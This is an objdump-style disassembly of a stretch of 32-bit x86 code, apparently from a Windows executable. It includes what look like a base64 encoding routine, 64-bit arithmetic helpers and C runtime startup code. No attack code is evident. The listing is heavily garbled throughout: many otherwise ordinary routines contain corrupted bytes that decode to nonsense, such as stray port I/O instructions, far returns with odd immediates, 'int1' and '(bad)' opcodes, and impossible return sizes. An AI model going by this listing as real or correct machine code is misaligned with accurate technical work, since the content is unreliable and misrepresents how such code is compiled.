  40b3a4:	8b e5                	mov    %ebp,%esp
  40b3a6:	5d                   	pop    %ebp
  40b3a7:	ec                   	in     (%dx),%al
  40b3a8:	04 00                	add    $0x0,%al
  40b3aa:	90                   	nop
  40b3ab:	90                   	nop
  40b3ac:	0d 90 90 70 77       	or     $0x77709090,%eax
  40b3b1:	8b ec                	mov    %esp,%ebp
  40b3b3:	8b 45 08             	mov    0x8(%ebp),%eax
  40b3b6:	8d 48 02             	lea    0x2(%eax),%ecx
  40b3b9:	b8 56 b1 3b 55       	mov    $0x553bb156,%eax
  40b3be:	f6 e9                	imul   %cl
  40b3c0:	90                   	nop
  40b3c1:	ca c1 8f             	lret   $0x8fc1
  40b3c4:	1f                   	pop    %ds
  40b3c5:	9f                   	lahf
  40b3c6:	d1 8d 04 95 01 00    	rorl   $1,0x19504(%ebp)
  40b3cc:	e4 00                	in     $0x0,%al
  40b3ce:	5d                   	pop    %ebp
  40b3cf:	c2 14 c5             	ret    $0xc514
  40b3d2:	bf 90 90 90 b5       	mov    $0xb5909090,%edi
  40b3d7:	90                   	nop
  40b3d8:	90                   	nop
  40b3d9:	90                   	nop
  40b3da:	90                   	nop
  40b3db:	90                   	nop
  40b3dc:	90                   	nop
  40b3dd:	90                   	nop
  40b3de:	5b                   	pop    %ebx
  40b3df:	90                   	nop
  40b3e0:	a2 8b ec 8b 45       	mov    %al,0x458bec8b
  40b3e5:	10 8b 4d 0c 86 55    	adc    %cl,0x55860c4d(%ebx)
  40b3eb:	08 50 51             	or     %dl,0x51(%eax)
  40b3ee:	52                   	push   %edx
  40b3ef:	36 0c 00             	ss or  $0x0,%al
  40b3f2:	00 00                	add    %al,(%eax)
  40b3f4:	e0 62                	loopne 0x40b458
  40b3f6:	0c 00                	or     $0x0,%al
  40b3f8:	3e 90                	ds nop
  40b3fa:	90                   	nop
  40b3fb:	90                   	nop
  40b3fc:	90                   	nop
  40b3fd:	90                   	nop
  40b3fe:	90                   	nop
  40b3ff:	c5 55 8b             	lds    -0x75(%ebp),%edx
  40b402:	ec                   	in     (%dx),%al
  40b403:	8b 55 3e             	mov    0x3e(%ebp),%edx
  40b406:	f7 45 08 53 56 8d 4a 	testl  $0x4a8d5653,0x8(%ebp)
  40b40d:	fe                   	(bad)
  40b40e:	b9 f6 01 8b 22       	mov    $0x228b01f6,%ecx
  40b413:	0c 85                	or     $0x85,%al
  40b415:	c9                   	leave
  40b416:	7e 42                	jle    0x40b45a
  40b418:	33 d2                	xor    %edx,%edx
  40b41a:	33 db                	xor    %ebx,%ebx
  40b41c:	8a 14 37             	mov    (%edi,%esi,1),%dl
  40b41f:	b3 c6                	mov    $0xc6,%bl
  40b421:	03 c1                	add    %ecx,%eax
  40b423:	ea 91 ef 8a 92 18 c7 	ljmp   $0xc718,$0x928aef91
  40b42a:	40                   	inc    %eax
  40b42b:	00 88 50 ff 79 54    	add    %cl,0x5479ff50(%eax)
  40b431:	37                   	aaa
  40b432:	fd                   	std
  40b433:	b6 ce                	mov    $0xce,%dh
  40b435:	b7 fe                	mov    $0xfe,%bh
  40b437:	83 e2 03             	and    $0x3,%edx
  40b43a:	f1                   	int1
  40b43b:	e2 04                	loop   0x40b441
  40b43d:	c1 eb 04             	shr    $0x4,%ebx
  40b440:	0b 40 33             	or     0x33(%eax),%eax
  40b443:	db 40 8a             	fildl  -0x76(%eax)
  40b446:	92                   	xchg   %eax,%edx
  40b447:	18 c7                	sbb    %al,%bh
  40b449:	40                   	inc    %eax
  40b44a:	00 88 50 ff ec 54    	add    %cl,0x54ecff50(%eax)
  40b450:	37                   	aaa
  40b451:	fe 8a c6 37 ff 8c    	decb   -0x7300c83a(%edx)
  40b457:	c5 0f                	lds    (%edi),%ecx
  40b459:	c1 e2 02             	shl    $0x2,%edx
  40b45c:	c1 3f 06             	sarl   $0x6,(%edi)
  40b45f:	0b d3                	or     %ebx,%edx
  40b461:	97                   	xchg   %eax,%edi
  40b462:	8a 92 fb c8 40 00    	mov    0x40c8fb(%edx),%dl
  40b468:	88 50 ff             	mov    %dl,-0x1(%eax)
  40b46b:	8a 69 17             	mov    0x17(%ecx),%ch
  40b46e:	ff 83 e2 3f b5 3b    	incl   0x3bb53fe2(%ebx)
  40b474:	f1                   	int1
  40b475:	8a 92 18 c7 40 00    	mov    0x40c718(%edx),%dl
  40b47b:	88 50 ff             	mov    %dl,-0x1(%eax)
  40b47e:	d8 98 8b 55 10 3b    	fcomps 0x3b10558b(%eax)
  40b484:	f2 7d 52             	bnd jge 0x40b4d9
  40b487:	33 4c 8a 08          	xor    0x8(%edx,%ecx,4),%ecx
  40b48b:	3e c1 e9 02          	ds shr $0x2,%ecx
  40b48f:	40                   	inc    %eax
  40b490:	fc                   	cld
  40b491:	8a 97 75 c7 40 00    	mov    0x40c775(%edi),%dl
  40b497:	3b f2                	cmp    %edx,%esi
  40b499:	88 48 ff             	mov    %cl,-0x1(%eax)
  40b49c:	8a 14 3e             	mov    (%esi,%edi,1),%dl
  40b49f:	75 15                	jne    0x40b4b6
  40b4a1:	83 e2 03             	and    $0x3,%edx
  40b4a4:	c1 e2 dd             	shl    $0xdd,%edx
  40b4a7:	40                   	inc    %eax
  40b4a8:	8a a7 18 c7 40 00    	mov    0x40c718(%edi),%ah
  40b4ae:	88 48 ff             	mov    %cl,-0x1(%eax)
  40b4b1:	c6 00 3d             	movb   $0x3d,(%eax)
  40b4b4:	eb 2b                	jmp    0x40b4e1
  40b4b6:	8d 53 47             	lea    0x47(%ebx),%edx
  40b4b9:	36 33 db             	ss xor %ebx,%ebx
  40b4bc:	83 e2 03             	and    $0x3,%edx
  40b4bf:	8a 19                	mov    (%ecx),%bl
  40b4c1:	c1 e2 04             	shl    $0x4,%edx
  40b4c4:	c1 eb 04             	shr    $0x4,%ebx
  40b4c7:	0b e9                	or     %ecx,%ebp
  40b4c9:	40                   	inc    %eax
  40b4ca:	8a 92 18 c7 1c 00    	mov    0x1cc718(%edx),%dl
  40b4d0:	aa                   	stos   %al,%es:(%edi)
  40b4d1:	50                   	push   %eax
  40b4d2:	ff 8a 09 83 cc 0f    	decl   0xfcc8309(%edx)
  40b4d8:	98                   	cwtl
  40b4d9:	14 8d                	adc    $0x8d,%al
  40b4db:	18 c7                	sbb    %al,%bh
  40b4dd:	b2 09                	mov    $0x9,%dl
  40b4df:	88 10                	mov    %dl,(%eax)
  40b4e1:	40                   	inc    %eax
  40b4e2:	c6 00 3d             	movb   $0x3d,(%eax)
  40b4e5:	40                   	inc    %eax
  40b4e6:	8b 55 08             	mov    0x8(%ebp),%edx
  40b4e9:	c6                   	(bad)
  40b4ea:	2a 00                	sub    (%eax),%al
  40b4ec:	2b c2                	sub    %edx,%eax
  40b4ee:	5f                   	pop    %edi
  40b4ef:	5e                   	pop    %esi
  40b4f0:	40                   	inc    %eax
  40b4f1:	5b                   	pop    %ebx
  40b4f2:	5d                   	pop    %ebp
  40b4f3:	c2 0c 00             	ret    $0xc
  40b4f6:	90                   	nop
  40b4f7:	90                   	nop
  40b4f8:	91                   	xchg   %eax,%ecx
  40b4f9:	90                   	nop
  40b4fa:	90                   	nop
  40b4fb:	90                   	nop
  40b4fc:	45                   	inc    %ebp
  40b4fd:	90                   	nop
  40b4fe:	90                   	nop
  40b4ff:	90                   	nop
  40b500:	83 3d 58 40 41 00 d4 	cmpl   $0xffffffd4,0x414058
  40b507:	75 0c                	jne    0x40b515
  40b509:	4a                   	dec    %edx
  40b50a:	1c 24                	sbb    $0x24,%al
  40b50c:	04 ff                	add    $0xff,%al
  40b50e:	15 f8 c0 40 00       	adc    $0x40c0f8,%eax
  40b513:	59                   	pop    %ecx
  40b514:	c3                   	ret
  40b515:	68 d0 40 41 00       	push   $0x4140d0
  40b51a:	83 fb 36             	cmp    $0x36,%ebx
  40b51d:	99                   	cltd
  40b51e:	00 ff                	add    %bh,%bh
  40b520:	74 c9                	je     0x40b4eb
  40b522:	0c e8                	or     $0xe8,%al
  40b524:	f8                   	clc
  40b525:	23 00                	and    (%eax),%eax
  40b527:	9f                   	lahf
  40b528:	83 c4 0c             	add    $0xc,%esp
  40b52b:	c3                   	ret
  40b52c:	b3 74                	mov    $0x74,%bl
  40b52e:	24 04                	and    $0x4,%al
  40b530:	e8 8e ff ff ff       	call   0x40b4c3
  40b535:	e4 d8                	in     $0xd8,%al
  40b537:	1b c0                	sbb    %eax,%eax
  40b539:	59                   	pop    %ecx
  40b53a:	f7 d8                	neg    %eax
  40b53c:	48                   	dec    %eax
  40b53d:	c3                   	ret
  40b53e:	cc                   	int3
  40b53f:	30 8b 44 24 08 8b    	xor    %cl,-0x74f7dbbc(%ebx)
  40b545:	4c                   	dec    %esp
  40b546:	24 10                	and    $0x10,%al
  40b548:	0b c8                	or     %eax,%ecx
  40b54a:	8b a0 5a 0c 44 f8    	mov    -0x7bbf3a6(%eax),%esp
  40b550:	8b 44 58 04          	mov    0x4(%eax,%ebx,2),%eax
  40b554:	f7 e1                	mul    %ecx
  40b556:	c2 d8 00             	ret    $0xd8
  40b559:	53                   	push   %ebx
  40b55a:	f7 e1                	mul    %ecx
  40b55c:	8b d8                	mov    %eax,%ebx
  40b55e:	8b 44 24 08          	mov    0x8(%esp),%eax
  40b562:	f7 64 24 e7          	mull   -0x19(%esp)
  40b566:	03 d8                	add    %eax,%ebx
  40b568:	8b c1                	mov    %ecx,%eax
  40b56a:	24 4a                	and    $0x4a,%al
  40b56c:	f7 e1                	mul    %ecx
  40b56e:	03 d3                	add    %ebx,%edx
  40b570:	5b                   	pop    %ebx
  40b571:	c2 10 00             	ret    $0x10
  40b574:	cc                   	int3
  40b575:	cc                   	int3
  40b576:	cc                   	int3
  40b577:	e0 1c                	loopne 0x40b595
  40b579:	39 cc                	cmp    %ecx,%esp
  40b57b:	cc                   	int3
  40b57c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b57d:	8e cc                	mov    %esp,%cs
  40b57f:	c6                   	(bad)
  40b580:	ff 25 40 8b 40 00    	jmp    *0x408b40
  40b586:	cc                   	int3
  40b587:	42                   	inc    %edx
  40b588:	cc                   	int3
  40b589:	cc                   	int3
  40b58a:	cc                   	int3
  40b58b:	cc                   	int3
  40b58c:	cc                   	int3
  40b58d:	cb                   	lret
  40b58e:	cc                   	int3
  40b58f:	cc                   	int3
  40b590:	57                   	push   %edi
  40b591:	56                   	push   %esi
  40b592:	53                   	push   %ebx
  40b593:	6e                   	outsb  %ds:(%esi),(%dx)
  40b594:	ff 8b 44 b1 14 0b    	decl   0xb14b144(%ebx)
  40b59a:	c0 7d 4b bb          	sarb   $0xbb,0x4b(%ebp)
  40b59e:	8b 54 24 f4          	mov    -0xc(%esp),%edx
  40b5a2:	f7 d8                	neg    %eax
  40b5a4:	f7 da                	neg    %edx
  40b5a6:	83 d8 00             	sbb    $0x0,%eax
  40b5a9:	89 44 24 14          	mov    %eax,0x14(%esp)
  40b5ad:	89 a6 92 10 8b 44    	mov    %esp,0x448b1092(%esi)
  40b5b3:	24 1c                	and    $0x1c,%al
  40b5b5:	0b c0                	or     %eax,%eax
  40b5b7:	7d 60                	jge    0x40b619
  40b5b9:	47                   	inc    %edi
  40b5ba:	8b 54 24 18          	mov    0x18(%esp),%edx
  40b5be:	f7 d8                	neg    %eax
  40b5c0:	f7 da                	neg    %edx
  40b5c2:	83 71 d8 89          	xorl   $0xffffff89,-0x28(%ecx)
  40b5c6:	2a 24 1c             	sub    (%esp,%ebx,1),%ah
  40b5c9:	ff                   	(bad)
  40b5ca:	38 24 18             	cmp    %ah,(%eax,%ebx,1)
  40b5cd:	0b c0                	or     %eax,%eax
  40b5cf:	75 18                	jne    0x40b5e9
  40b5d1:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40b5d5:	8b 44 24 14          	mov    0x14(%esp),%eax
  40b5d9:	33 d2                	xor    %edx,%edx
  40b5db:	6b fe 8b             	imul   $0xffffff8b,%esi,%edi
  40b5de:	d8 8b 44 24 10 f7    	fmuls  -0x8efdbbc(%ebx)
  40b5e4:	f1                   	int1
  40b5e5:	8b d3                	mov    %ebx,%edx
  40b5e7:	34 41                	xor    $0x41,%al
  40b5e9:	8b d8                	mov    %eax,%ebx
  40b5eb:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40b5ef:	8b 54 24 14          	mov    0x14(%esp),%edx
  40b5f3:	f0 44                	lock inc %esp
  40b5f5:	24 10                	and    $0x10,%al
  40b5f7:	d1 eb                	shr    $1,%ebx
  40b5f9:	d1 d9                	rcr    $1,%ecx
  40b5fb:	d1 ea                	shr    $1,%edx
  40b5fd:	75 5b                	jne    0x40b65a
  40b5ff:	0b db                	or     %ebx,%ebx
  40b601:	75 09                	jne    0x40b60c
  40b603:	d6                   	salc
  40b604:	46                   	inc    %esi
  40b605:	8b f0                	mov    %eax,%esi
  40b607:	f7 64 24 1c          	mull   0x1c(%esp)
  40b60b:	4d                   	dec    %ebp
  40b60c:	c8 8b 44 24          	enter  $0x448b,$0x24
  40b610:	18 f7                	sbb    %dh,%bh
  40b612:	e6 03                	out    %al,$0x3
  40b614:	d1 72 0e             	shll   $1,0xe(%edx)
  40b617:	c9                   	leave
  40b618:	54                   	push   %esp
  40b619:	24 38                	and    $0x38,%al
  40b61b:	77 08                	ja     0x40b625
  40b61d:	72 07                	jb     0x40b626
  40b61f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40b623:	76 01                	jbe    0x40b626
  40b625:	4e                   	dec    %esi
  40b626:	33 d2                	xor    %edx,%edx
  40b628:	8b c6                	mov    %esi,%eax
  40b62a:	4f                   	dec    %edi
  40b62b:	75 07                	jne    0x40b634
  40b62d:	f7 92 f7 d8 83 1f    	notl   0x1f83d8f7(%edx)
  40b633:	00 82 5e 94 4b cd    	add    %al,-0x32b46ba2(%edx)
  40b639:	00 55 ca             	add    %dl,-0x36(%ebp)
  40b63c:	ec                   	in     (%dx),%al
  40b63d:	6a ff                	push   $0xffffffff
  40b63f:	68 60 0d 59 38       	push   $0x38590d60
  40b644:	02 48 b9             	add    -0x47(%eax),%cl
  40b647:	19 00                	sbb    %eax,(%eax)
  40b649:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40b64f:	50                   	push   %eax
  40b650:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40b657:	83 9d fb 14 be 57 89 	sbbl   $0xffffff89,0x57be14fb(%ebp)
  40b65e:	65 e8 83 65 fc 00    	gs call 0x13d1be7
  40b664:	6a 01                	push   $0x1
  40b666:	ff 34 d0             	push   (%eax,%edx,8)
  40b669:	c0 40 00 59          	rolb   $0x59,0x0(%eax)
  40b66d:	83 0d 54 09 41 00 ff 	orl    $0xffffffff,0x410954
  40b674:	83 0d 58 40 41 8b ff 	orl    $0xffffffff,0x8b414058
  40b67b:	ff 15 d4 c0 40 00    	call   *0x40c0d4
  40b681:	8b 0d 98 0b 50 00    	mov    0x500b98,%ecx
  40b687:	89 99 ff 15 d8 c0    	mov    %ebx,-0x3f27ea01(%ecx)
  40b68d:	40                   	inc    %eax
  40b68e:	00 8b 0d 94 0b 41    	add    %cl,0x410b940d(%ebx)
  40b694:	68 bb 08 a1 dc       	push   $0xdca108bb
  40b699:	c0 40 9f 8b          	rolb   $0x8b,-0x61(%eax)
  40b69d:	00 a3 50 40 41 00    	add    %ah,0x414050(%ebx)
  40b6a3:	e8 9f 02 00 00       	call   0x40b947
  40b6a8:	83 3d 50 02 41 00 00 	cmpl   $0x0,0x410250
  40b6af:	75 0c                	jne    0x40b6bd
  40b6b1:	4e                   	dec    %esi
  40b6b2:	44                   	inc    %esp
  40b6b3:	91                   	xchg   %eax,%ecx
  40b6b4:	40                   	inc    %eax
  40b6b5:	00 ff                	add    %bh,%bh
  40b6b7:	15 e0 c0 40 34       	adc    $0x3440c0e0,%eax
  40b6bc:	59                   	pop    %ecx
  40b6bd:	12 70 02             	adc    0x2(%eax),%dh
  40b6c0:	00 00                	add    %al,(%eax)
  40b6c2:	b6 1f                	mov    $0x1f,%dh
  40b6c4:	d0 94 00 63 08 fc 40 	rclb   $1,0x40fc0863(%eax,%eax,1)
  40b6cb:	00 92 5b 81 00 00    	add    %dl,0x815b(%edx)
  40b6d1:	0a 2b                	or     (%ebx),%ch
  40b6d3:	0b 41 00             	or     0x0(%ecx),%eax
  40b6d6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40b6d9:	8d a6 d8 50 ff 35    	lea    0x35ff50d8(%esi),%esp
  40b6df:	8c 0b                	mov    %cs,(%ebx)
  40b6e1:	41                   	inc    %ecx
  40b6e2:	e7 8d                	out    %eax,$0x8d
  40b6e4:	45                   	inc    %ebp
  40b6e5:	e0 30                	loopne 0x40b717
  40b6e7:	8d 6a d4             	lea    -0x2c(%edx),%ebp
  40b6ea:	50                   	push   %eax
  40b6eb:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40b6ee:	50                   	push   %eax
  40b6ef:	ff 15 e8 c0 39 6c    	call   *0x6c39c0e8
  40b6f5:	68 04 d0 40 00       	push   $0x40d004
  40b6fa:	68 00 d0 40 35       	push   $0x3540d000
  40b6ff:	e8 70 02 00 00       	call   0x40b974
  40b704:	ff 15 ec c0 40 00    	call   *0x40c0ec
  40b70a:	d9 4d d1             	(bad) -0x2f(%ebp)
  40b70d:	89 08                	mov    %ecx,(%eax)
  40b70f:	ff c9                	dec    %ecx
  40b711:	e0 ff                	loopne 0x40b712
  40b713:	a0 22 ff 75 4c       	mov    0x4c75ff22,%al
  40b718:	e8 e3 58 a6 ff       	call   0xffe71000
  40b71d:	83 14 2b 89          	adcl   $0xffffff89,(%ebx,%ebp,1)
  40b721:	cb                   	lret
  40b722:	dc 50 ff             	fcoml  -0x1(%eax)
  40b725:	15 70 c1 96 00       	adc    $0x96c170,%eax
  40b72a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40b72d:	8b 08                	mov    (%eax),%ecx
  40b72f:	8b 09                	mov    (%ecx),%ecx
  40b731:	89 4d 58             	mov    %ecx,0x58(%ebp)
  40b734:	50                   	push   %eax
  40b735:	51                   	push   %ecx
  40b736:	e8 97 01 00 00       	call   0x40b8d2
  40b73b:	59                   	pop    %ecx
  40b73c:	59                   	pop    %ecx
  40b73d:	c3                   	ret
  40b73e:	8b ca                	mov    %edx,%ecx
  40b740:	e8 ff 75 d0 ff       	call   0x112d44
  40b745:	15 61 c0 40 00       	adc    $0x40c061,%eax
  40b74a:	cc                   	int3
  40b74b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b74c:	cc                   	int3
  40b74d:	cc                   	int3
  40b74e:	b9 cc 53 57 33       	mov    $0x335753cc,%ecx
  40b753:	ff a0 44 24 10 0b    	jmp    *0xb102444(%eax)
  40b759:	c0 b8 14 47 8b 54 24 	sarb   $0x24,0x548b4714(%eax)
  40b760:	0e                   	push   %cs
  40b761:	f7 85 f7 da 83 d8 00 	testl  $0xd6448900,-0x277c2509(%ebp)
  40b768:	89 44 d6 
  40b76b:	10 c7                	adc    %al,%bh
  40b76d:	54                   	push   %esp
  40b76e:	24 0c                	and    $0xc,%al
  40b770:	8b 44 24 18          	mov    0x18(%esp),%eax
  40b774:	0b c0                	or     %eax,%eax
  40b776:	d7                   	xlat   %ds:(%ebx)
  40b777:	13 15 fc 24 14 f7    	adc    0xf71424fc,%edx
  40b77d:	d8 f7                	fdiv   %st(7),%st
  40b77f:	da 31                	fidivl (%ecx)
  40b781:	03 00                	add    (%eax),%eax
  40b783:	89 44 24 7d          	mov    %eax,0x7d(%esp)
  40b787:	89 54 36 14          	mov    %edx,0x14(%esi,%esi,1)
  40b78b:	24 c0                	and    $0xc0,%al
  40b78d:	75 1b                	jne    0x40b7aa
  40b78f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40b793:	8b 44 24 10          	mov    0x10(%esp),%eax
  40b797:	33 d2                	xor    %edx,%edx
  40b799:	f7 f1                	div    %ecx
  40b79b:	57                   	push   %edi
  40b79c:	44                   	inc    %esp
  40b79d:	24 0c                	and    $0xc,%al
  40b79f:	f7 f1                	div    %ecx
  40b7a1:	8b c2                	mov    %edx,%eax
  40b7a3:	33 d2                	xor    %edx,%edx
  40b7a5:	4f                   	dec    %edi
  40b7a6:	79 4e                	jns    0x40b7f6
  40b7a8:	98                   	cwtl
  40b7a9:	53                   	push   %ebx
  40b7aa:	8b 65 8b             	mov    -0x75(%ebp),%esp
  40b7ad:	4c                   	dec    %esp
  40b7ae:	24 14                	and    $0x14,%al
  40b7b0:	8b 54 24 10          	mov    0x10(%esp),%edx
  40b7b4:	8b 44 e4 0c          	mov    0xc(%esp,%eiz,8),%eax
  40b7b8:	d1 eb                	shr    $1,%ebx
  40b7ba:	d1 d9                	rcr    $1,%ecx
  40b7bc:	d1 ea                	shr    $1,%edx
  40b7be:	d1 d8                	rcr    $1,%eax
  40b7c0:	0b db                	or     %ebx,%ebx
  40b7c2:	95                   	xchg   %eax,%ebp
  40b7c3:	f4                   	hlt
  40b7c4:	f7 f1                	div    %ecx
  40b7c6:	8b c8                	mov    %eax,%ecx
  40b7c8:	f7 64 24 18          	mull   0x18(%esp)
  40b7cc:	bc f7 64 24 14       	mov    $0x142464f7,%esp
  40b7d1:	f9                   	stc
  40b7d2:	d1 72 0e             	shll   $1,0xe(%edx)
  40b7d5:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40b7d9:	77 5c                	ja     0x40b837
  40b7db:	3e 0e                	ds push %cs
  40b7dd:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40b7e1:	76 08                	jbe    0x40b7eb
  40b7e3:	2b 44 43 14          	sub    0x14(%ebx,%eax,2),%eax
  40b7e7:	1b 54 73 18          	sbb    0x18(%ebx,%esi,2),%edx
  40b7eb:	2b 44 24 0c          	sub    0xc(%esp),%eax
  40b7ef:	1b 54 24 10          	sbb    0x10(%esp),%edx
  40b7f3:	4f                   	dec    %edi
  40b7f4:	79 07                	jns    0x40b7fd
  40b7f6:	f7 da                	neg    %edx
  40b7f8:	f7 d8                	neg    %eax
  40b7fa:	da d5                	fcmovbe %st(5),%st
  40b7fc:	00 5f 5b             	add    %bl,0x5b(%edi)
  40b7ff:	c2 10 b1             	ret    $0xb110
  40b802:	cc                   	int3
  40b803:	cc                   	int3
  40b804:	cc                   	int3
  40b805:	cc                   	int3
  40b806:	cc                   	int3
  40b807:	cc                   	int3
  40b808:	cc                   	int3
  40b809:	cc                   	int3
  40b80a:	cc                   	int3
  40b80b:	cc                   	int3
  40b80c:	cc                   	int3
  40b80d:	ac                   	lods   %ds:(%esi),%al
  40b80e:	cc                   	int3
  40b80f:	cc                   	int3
  40b810:	80 f9 40             	cmp    $0x40,%cl
  40b813:	73 16                	jae    0x40b82b
  40b815:	80 f9 20             	cmp    $0x20,%cl
  40b818:	73 06                	jae    0x40b820
  40b81a:	69 ad 4b d3 fa c3 8b 	imul   $0xfa8d4f8b,-0x3c052cb5(%ebp),%ebp
  40b821:	4f 8d fa 
  40b824:	1f                   	pop    %ds
  40b825:	80 e1 1f             	and    $0x1f,%cl
  40b828:	d3 f8                	sar    %cl,%eax
  40b82a:	c3                   	ret
  40b82b:	d5 fa                	aad    $0xfa
  40b82d:	46                   	inc    %esi
  40b82e:	e7 c2                	out    %eax,$0xc2
  40b830:	c3                   	ret
  40b831:	cc                   	int3
  40b832:	cc                   	int3
  40b833:	cc                   	int3
  40b834:	cc                   	int3
  40b835:	cc                   	int3
  40b836:	cc                   	int3
  40b837:	e1 43                	loope  0x40b87c
  40b839:	8e 3a                	mov    (%edx),%?
  40b83b:	cc                   	int3
  40b83c:	cc                   	int3
  40b83d:	2e cc                	cs int3
  40b83f:	fa                   	cli
  40b840:	51                   	push   %ecx
  40b841:	19 00                	sbb    %eax,(%eax)
  40b843:	02 00                	add    (%eax),%al
  40b845:	00 bd 36 24 08 72    	add    %bh,0x72082436(%ebp)
  40b84b:	14 81                	adc    $0x81,%al
  40b84d:	e9 1e 10 00 00       	jmp    0x40c870
  40b852:	2d c4 10 00 00       	sub    $0x10c4,%eax
  40b857:	f1                   	int1
  40b858:	db 3d 00 43 00 73    	fstpt  0x73004300
  40b85e:	2d ec 2b c8 8b       	sub    $0x8bc82bec,%eax
  40b863:	51                   	push   %ecx
  40b864:	85 01                	test   %eax,(%ecx)
  40b866:	8b 93 8b 08 8b 40    	mov    0x408b088b(%ebx),%edx
  40b86c:	04 50                	add    $0x50,%al
  40b86e:	c3                   	ret
  40b86f:	cc                   	int3
  40b870:	80 f9 49             	cmp    $0x49,%cl
  40b873:	73 23                	jae    0x40b898
  40b875:	80 d1 a0             	adc    $0xa0,%cl
  40b878:	73 06                	jae    0x40b880
  40b87a:	0f a5 c2             	shld   %cl,%eax,%edx
  40b87d:	d3 e0                	shl    %cl,%eax
  40b87f:	8b 8b d0 33 cc 80    	mov    -0x7f33cc30(%ebx),%ecx
  40b885:	e1 d2                	loope  0x40b859
  40b887:	b8 a1 f6 33 c0       	mov    $0xc033f6a1,%eax
  40b88c:	be d2 c3 cc 53       	mov    $0x53ccc3d2,%esi
  40b891:	56                   	push   %esi
  40b892:	8b 44 24 54          	mov    0x54(%esp),%eax
  40b896:	11 c0                	adc    %eax,%eax
  40b898:	75 18                	jne    0x40b8b2
  40b89a:	8b 4c a8 14          	mov    0x14(%eax,%ebp,4),%ecx
  40b89e:	8b 44 24 10          	mov    0x10(%esp),%eax
  40b8a2:	33 61 f7             	xor    -0x9(%ecx),%esp
  40b8a5:	f1                   	int1
  40b8a6:	f9                   	stc
  40b8a7:	d8 8b 44 24 b4 f7    	fmuls  -0x84bdbbc(%ebx)
  40b8ad:	f1                   	int1
  40b8ae:	23 93 eb 41 8b c8    	and    -0x3774be15(%ebx),%edx
  40b8b4:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40b8b8:	8b 27                	mov    (%edi),%esp
  40b8ba:	24 ad                	and    $0xad,%al
  40b8bc:	8b 44 24 9a          	mov    -0x66(%esp),%eax
  40b8c0:	d1 e9                	shr    $1,%ecx
  40b8c2:	d1 db                	rcr    $1,%ebx
  40b8c4:	d1 ea                	shr    $1,%edx
  40b8c6:	d1 84 26 c9 75 f4 f7 	roll   $1,-0x80b8a37(%esi,%eiz,1)
  40b8cd:	f3 8b e7             	repz mov %edi,%esp
  40b8d0:	f7 64 24 c4          	mull   -0x3c(%esp)
  40b8d4:	8b c8                	mov    %eax,%ecx
  40b8d6:	26 44                	es inc %esp
  40b8d8:	24 14                	and    $0x14,%al
  40b8da:	f7 30                	divl   (%eax)
  40b8dc:	03 d1                	add    %ecx,%edx
  40b8de:	72 0e                	jb     0x40b8ee
  40b8e0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40b8e4:	ab                   	stos   %eax,%es:(%edi)
  40b8e5:	08 72 7f             	or     %dh,0x7f(%edx)
  40b8e8:	3b 4d 24             	cmp    0x24(%ebp),%ecx
  40b8eb:	0c 76                	or     $0x76,%al
  40b8ed:	01 4e 33             	add    %ecx,0x33(%esi)
  40b8f0:	d2 6c 38 5e          	shrb   %cl,0x5e(%eax,%edi,1)
  40b8f4:	5b                   	pop    %ebx
  40b8f5:	c2 10 00             	ret    $0x10
  40b8f8:	cc                   	int3
  40b8f9:	cc                   	int3
  40b8fa:	cc                   	int3
  40b8fb:	cc                   	int3
  40b8fc:	fa                   	cli
  40b8fd:	cc                   	int3
  40b8fe:	fa                   	cli
  40b8ff:	cc                   	int3
  40b900:	80 f9 40             	cmp    $0x40,%cl
  40b903:	73 15                	jae    0x40b91a
  40b905:	94                   	xchg   %eax,%esp
  40b906:	f9                   	stc
  40b907:	20 73 06             	and    %dh,0x6(%ebx)
  40b90a:	0f                   	lfs    (bad),%edx
  40b90b:	b4 d0                	mov    $0xd0,%ah
  40b90d:	d3 ea                	shr    %cl,%edx
  40b90f:	81 6e 52 33 2f 80 e1 	subl   $0xe1802f33,0x52(%esi)
  40b916:	28 29                	sub    %ch,(%ecx)
  40b918:	e8 c3 33 c0 33       	call   0x3400ece0
  40b91d:	d2 c3                	rol    %cl,%bl
  40b91f:	cc                   	int3
  40b920:	ff 25 fc c0 40 00    	jmp    *0x40c0fc
  40b926:	c9                   	leave
  40b927:	25 f0 c0 40 00       	and    $0x40c0f0,%eax
  40b92c:	ff 25 e4 b0 40 7d    	jmp    *0x7d40b0e4
  40b932:	14 00                	adc    $0x0,%al
  40b934:	00 03                	add    %al,(%ebx)
  40b936:	00 30                	add    %dh,(%eax)
  40b938:	28 00                	sub    %al,(%eax)
  40b93a:	6a 00                	push   $0x0
  40b93c:	e8 3e 00 e3 00       	call   0x123b97f
  40b941:	ef                   	out    %eax,(%dx)
  40b942:	59                   	pop    %ecx
  40b943:	03 33                	add    (%ebx),%esi
  40b945:	c0 c3 c3             	rol    $0xc3,%bl
  40b948:	ff 25 cc c0 40 00    	jmp    *0x40c0cc
  40b94e:	ff 25 84 d8 40 00    	jmp    *0x40d884
  40b954:	cc                   	int3
  40b955:	cc                   	int3
  40b956:	cc                   	int3
  40b957:	cc                   	int3
  40b958:	19 cc                	sbb    %ecx,%esp
  40b95a:	cc                   	int3
  40b95b:	cc                   	int3
  40b95c:	cc                   	int3
  40b95d:	a2 cc 35 ff 25       	mov    %al,0x25ff35cc
  40b962:	cc                   	int3
  40b963:	c1                   	.byte 0xc1
  40b964:	40                   	inc    %eax
	...
